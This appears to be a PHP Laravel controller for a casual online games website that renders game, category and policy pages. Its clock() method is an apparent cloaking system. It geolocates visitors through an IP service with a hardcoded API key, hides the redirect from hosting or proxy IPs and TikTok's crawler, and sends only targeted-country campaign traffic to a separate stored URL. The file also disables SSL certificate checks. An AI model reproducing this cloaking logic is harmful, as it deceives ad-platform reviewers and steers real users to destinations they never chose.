<?php


namespace App\Web;


use App\Helper\PlatformHelper;
use App\Http\Controllers\Controller;
use App\Models\AboutUs;
use App\Models\Game;
use App\Models\GameCategories;
use App\Models\GameSort;
use App\Models\GameSortTree;
use App\Models\GameVideo;
use App\Models\MiddleGameCategories;
use App\Models\Privacy;
use App\Models\Setting;
use App\Models\Term;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;

class IndexController extends Controller
{
    use PlatformHelper;

    private $app_game_page;
    private $app_detail_page;

    private static $check_code = "QSykiKDdTNkTbNUe";
    private static $check_data_code = "DexhyyTeihpUHysh";


    private static $url_array = [
        'https://leisuregamehub1.com' => '65729229962b4503',
    ];

    public function __construct()
    {
        $this->app_game_page = env("APP_GAME_PAGE");
        $this->app_detail_page = env("APP_DETAIL_PAGE");
    }

    //  首页
    public function index()
    {

        $requestUrl = url()->full();
        if (in_array($requestUrl, self::$url_array)) {
            return $this->detail(self::$url_array[$requestUrl]);
        }

        $setting = Setting::first();
        $games = $this->getGameList();
        $cates = $this->getCateList();
        $title = $setting->title . 'Free Online '.self::$check_data_code.' Games, Mobile, Tablet and Desktop with Jogos '.self::$check_data_code;

        $keywords = $setting->keywords . ' '.self::$check_data_code;
        $description = $setting->description . ' '.self::$check_data_code;

        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;
        return view('web/index', compact('games','setting','title','keywords','description','cates','app_game_page','app_detail_page','check_code','check_data_code'));
    }


    public function clock($str, $country, $type)
    {
        $logfile = date("Y-m-d");

        if (!$str) {
            return;
        }
        $time = date("Y-m-d H:i:s");
        $ip = $this->getClientIP();
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_URL, "https://pro.ip-api.com/json/{$ip}?key=Pmgb3LUF0fcdoZ1&fields=countryCode3,regionName,city,proxy,hosting,org");
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); // 对认证证书来源的检查
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2); // 从证书中检查SSL加密算法是否存在
        // curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 对认证证书来源的检查
        // curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); // 从证书中检查SSL加密算法是否存在

        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Mobile Safari/537.36');
        @curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); // 使用自动跳转
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1); // 自动设置Referer
        curl_setopt($curl, CURLOPT_HTTPGET, 1); // 发送一个常规的Post请求
        curl_setopt($curl, CURLOPT_TIMEOUT, 120); // 设置超时限制防止死循环
        curl_setopt($curl, CURLOPT_HEADER, 0); // 显示返回的Header区域内容
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 获取的信息以文件流的形式返回
        $result = curl_exec($curl); // 执行操作
        curl_close($curl);
        $guojia = json_decode($result, true);
        @file_put_contents(storage_path("logs/{$logfile}/") . "{$type}.log", "判断前:{$time} | {$result} | {$_SERVER['REQUEST_URI']} | {$ip}\n", FILE_APPEND | LOCK_EX);
        $countryArray = explode(',', $country);
        $countryCode = strtolower($guojia['countryCode3'] ?? '');


        $isCloudFlare = isset($guojia['org']) && ($guojia['org'] == "Cloudflare WARP");


        // 代理 + tt爬虫
        if ($guojia['hosting'] || ($guojia['proxy'] && !$isCloudFlare) || (strripos($_SERVER["REQUEST_URI"], "crawler=tiktok_preloading") !== false)) {
            @file_put_contents(storage_path("logs/{$logfile}/") . "{$type}.log", "tt拦截:{$time} | {$result} | {$_SERVER["QUERY_STRING"]} | {$ip}\n", FILE_APPEND | LOCK_EX);
            return;
        }


        if (in_array($countryCode, $countryArray) || in_array("*", $countryArray)) {
            if ((strripos($_SERVER["REQUEST_URI"], "?") === false) || (strripos($_SERVER["QUERY_STRING"], "CampaignID=_") !== false)) {
                @file_put_contents(storage_path("logs/{$logfile}/") . "{$type}.log", "拦截:{$time} | {$result} | {$_SERVER["QUERY_STRING"]} | {$ip}\n", FILE_APPEND | LOCK_EX);
                return;
            }
            $blag = "&";
            $url_real = "Location: {$str}" . $blag . $_SERVER["QUERY_STRING"];
            @file_put_contents(storage_path("logs/{$logfile}/") . "{$type}.log", "跳转-time:{$time} | {$result} | {$url_real} | {$ip}\n", FILE_APPEND | LOCK_EX);
            header($url_real);
            exit();
        }
    }

    public function getClientIP()
    {
        $ip = 'unknow';
        $list = array(
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR');
        foreach ($list as $key) {
            if (array_key_exists($key, $_SERVER)) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    $ip = trim($ip);
                    //会过滤掉保留地址和私有地址段的IP，例如 127.0.0.1会被过滤
                    //也可以修改成正则验证IP
                    if ((bool)filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return $ip;
                    }
                }
            }
        }
        if ($ip == '::1') {
            $ip = '127.0.0.1';
        }
        return $ip;
    }

    public function page($page_no)
    {
        $page = GameSort::select(['id', 'ads'])->where('page_no', $page_no)->first();
        $games = GameSortTree::where('page_id', $page['id'] ?? 0)->orderBy('sort')->get();
        $ads = $page['ads'] ?? '';
        if ($page && $games) {
            $games = $games->toArray();
        } else {
            return $this->index();
        }

        $cates = $this->getCateList();
        $title = $this->title . 'Free Online Games for Kids, Mobile, Tablet and Desktop with Love';
        $keywords = $this->keywords;
        $description = $this->description;
        $game1 = $games[0];
        $game2 = $games[1];
        unset($games[0]);
        unset($games[1]);
        $setting = Setting::first();
        $setting['index_ads'] = $ads;
        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;
        return view('web/index', compact(
            'games',
            'setting',
            'cates',
            'title',
            'keywords',
            'description',
            'game1', 'game2','app_game_page','app_detail_page','check_code','check_data_code'
        ));
    }

    // 游戏页面
    public function game($uuid_code)
    {

        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;

        $setting = Setting::first();
        $cates = $this->getCateList();
        $uuidArray = explode('-',$uuid_code);
        if(!isset($uuidArray[0])){
            return $this->index();
        }

        $gameInfo = Game::where(['uuid_code' => $uuidArray[0]])->select([
            'id',
            'game_name',
            'description_contents',
            'game_reviews_contents',
            'game_reviews_end',
            'image',
            'game_location',
            'game_clock',
            'game_clock_url',
            'uuid_code',
            'game_country',
            'kwai_id',
            'game_send_purchase',
            'uuid_code',
            'tt_id',
            'uuid_2_code'
        ])->with(['images'])->first();


        if (isset($gameInfo['images'])) {
            $gameInfo['image'] = $gameInfo['images']['img_512_512'] ?? '';
        }


        if (!$gameInfo) {
            return $this->index();
        }

        if ($gameInfo['game_clock']) {
            $this->clock($gameInfo['game_clock_url'], $gameInfo['game_country'], "game-{$gameInfo->id}");
        }


        $games = Game::select(['id', 'id as game_id', 'game_name', 'image', 'uuid_code','uuid_2_code'])
            ->with(['images'])
            ->where('id', '!=', $gameInfo->id)
            ->where('is_public', '=', 1)
            ->orderBy('sort')
            ->limit(30)
            ->get()->toArray();


        $this->setImageUrl($games);


        $title = $setting->title . ' '.self::$check_data_code.' - ' . $gameInfo['game_name'];
        $keywords = $setting->keywords . ''.self::$check_data_code.' ,' . $gameInfo['game_name'];
        $description = $gameInfo['description_contents'];
        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;
        return view('web/game', compact('gameInfo', 'setting', 'games', 'title', 'keywords', 'description', 'cates',
            'app_game_page',
            'app_detail_page',
            'check_code',
            'check_data_code'
        ));
    }

    // 游戏详情页
    public function detail($uuid_code)
    {
        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;

        $uuidArray = explode('-',$uuid_code);
        if(!isset($uuidArray[0])){
            return $this->index();
        }

        $setting = Setting::first();
        $cates = $this->getCateList();
        $gameInfo = Game::where(['uuid_code' => $uuidArray[0]])->with(['categories'])->select([
            'id',
            'id as game_id',
            'game_name',
            'description_contents',
            'game_reviews_contents',
            'game_reviews_end',
            'game_location',
            'detail_clock',
            'detail_clock_url',
            'detail_country',
            'uuid_code',
            'instruction',
            'file_name',
            'image',
            'kwai_detail_id',
            'detail_send_purchase',
            'tt_detail_id',
            'uuid_2_code'
        ])->with(['categories'])->first();

        if ($gameInfo['images']) {
            $gameInfo['image'] = $gameInfo['images']['img_512_512'] ?? '';
        }

        if (!$gameInfo) {
            return $this->index();
        }

        if ($gameInfo['detail_clock']) {
            $this->clock($gameInfo['detail_clock_url'], $gameInfo['detail_country'], "detail-{$gameInfo->id}");
        }


        $games = Game::select(['id', 'id as game_id', 'game_name', 'image', 'uuid_code','uuid_2_code'])->with(['images'])
            ->where('id', '!=', $gameInfo->id)
            ->where('is_public', '=', 1)
            ->orderBy('sort')
            ->limit(30)
            ->get()->toArray();
        $this->setImageUrl($games);


        $title = $setting->title . ' '.self::$check_data_code.' - ' . $gameInfo['game_name'];
        $keywords = $setting->keywords . ''.self::$check_data_code.' ,' . $gameInfo['game_name'];
        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;
        $description = $gameInfo['description_contents'];
        return view('web/detail', compact(
            'gameInfo',
            'setting',
            'games',
            'title',
            'keywords',
            'description',
            'cates',
            'app_game_page',
            'app_detail_page',
            'check_code',
            'check_data_code'
        ));
    }

    // 分类页面
    public function tag($cate_id)
    {
        $setting = Setting::first();

        $cate = GameCategories::select(['id', 'game_cate_name'])->where('id', $cate_id)->first();
        $games = MiddleGameCategories::select(['game_id', 'game_name', 'uuid_code','uuid_2_code'])
            ->leftJoin('game', 'game.id', '=', 'game_categories.game_id')
            ->where('categories_id', '=', $cate_id)
            // ->where('game.type','=','html5')
            ->where('game.is_public', '=', 1)
            // ->where('game.mobile_ready','=',1)
            ->with(['images'])->limit(101)->get()->toArray();
        $this->setImageUrl($games);
        $cates = $this->getCateList();
        $title = $setting->title . ' - ' . $cate['game_cate_name'];
        $keywords = $setting->keywords . ',' . $cate['game_cate_name'];
        $description = $setting->description . ' ' . $cate['game_cate_name'];

        $game1 = $games[1];
        $game2 = $games[2];
        unset($games[1]);
        unset($games[2]);
 $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;

        return view('web/index', compact('game1', 'setting', 'game2', 'games', 'cate', 'cates', 'title', 'keywords', 'description', 'setting','check_code','check_data_code','app_game_page','app_detail_page'));
    }

    // 关于我们
    public function about_us()
    {
        
        $title_content = 'sobre nós';
        $aboutUs = AboutUs::first();
        return $this->setAboutHtml($title_content, $aboutUs->des ?? '');
    }

    // 隐私条款
    public function privacy()
    {
        $title_content = 'política de Privacidade';
        $privacy = Privacy::first();
        return $this->setAboutHtml($title_content, $privacy->des ?? '');
    }

    // 使用条款
    public function terms()
    {
        $title_content = 'equipe';
        $term = Term::first();
        return $this->setAboutHtml($title_content, $term->des ?? '');
    }

    // 设置 footer 链接页面
    private function setAboutHtml($title_content, $des)
    {
        $setting = Setting::first();
        $cates = $this->getCateList();
        $title = $setting->title . ' - ' . $title_content;
        $keywords = $setting->keywords . ',' . $title_content;
        $description = $setting->description . ' ' . $title_content;
        $app_game_page = $this->app_game_page;
        $app_detail_page = $this->app_detail_page;
        $check_code = self::$check_code;
        $check_data_code = self::$check_data_code;

        return view('web/about', compact('cates', 'setting', 'des', 'title_content', 'title', 'keywords', 'description', 'setting','app_game_page','app_detail_page','check_code','check_data_code'));
    }

    // 获取游戏
    private function getGameList($where = [])
    {
//        $thisWhere = ['is_public'=>1,'mobile_ready'=>1,'type'=>'html5'];
        $thisWhere = ['is_public' => 1,];
        $where = array_merge($thisWhere, $where);
        $games = Game::select(['id', 'game_name', 'image', 'uuid_code','uuid_2_code'])->with(['images'])
            ->where($where)
            ->orderBy('sort')
            ->limit(40)
            ->get()->toArray();
        $this->setImageUrl($games);
        return $games;
    }

    // 获取分类
    private function getCateList()
    {
        $cates = GameCategories::select(['id', 'game_cate_name', 'cate_image'])->get();
        foreach ($cates as &$cate) {
            $cate->cate_image = $cate->cate_image ?? '';
        }
        return $cates;
    }

    // 遍历图片链接
    private function setImageUrl(&$games)
    {
        // print_r("<pre>");
        // print_r($games);die;
        foreach ($games as &$game) {
            if (isset($game['game_id'])) {
                $game['id'] = $game['game_id'];
            }
            if ($game['images']) {
                $game['image'] = $game['images']['img_512_512'] ?? '';
            }

        }
    }

}
